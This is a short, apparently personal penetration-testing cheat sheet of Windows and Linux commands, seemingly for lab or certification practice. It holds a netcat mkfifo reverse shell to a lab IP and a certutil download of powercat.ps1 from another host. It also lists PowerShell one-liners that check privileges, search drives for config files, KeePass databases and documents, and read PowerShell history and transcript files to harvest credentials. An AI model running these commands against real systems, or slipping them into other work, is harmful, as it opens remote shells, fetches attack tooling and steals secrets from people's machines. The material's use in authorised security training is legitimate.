nc reverseshell bash:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
download:
certutil -urlcache -f http://192.168.45.248:8000/powercat.ps1 c:/windows/temp/test

find .git files
```
Get-ChildItem . -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter ".git" -Recurse
```
grep like powershell
```
Get-ChildItem -Recurse | Select-String "dummy" -List | Select Path
```

```
whoami /priv
```
```
Get-ChildItem -Path C:\ -Include *.conf,*.config,*.kdbx,*.log -File -Recurse -ErrorAction SilentlyContinue
```
```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
```
Get-ChildItem -Path C:\Users\ -Include *.log,*.conf,*.config,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
```
(Get-PSReadlineOption).HistorySavePath
```
```
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
```
type C:\Users\*\Transcripts\transcript01.txt
```
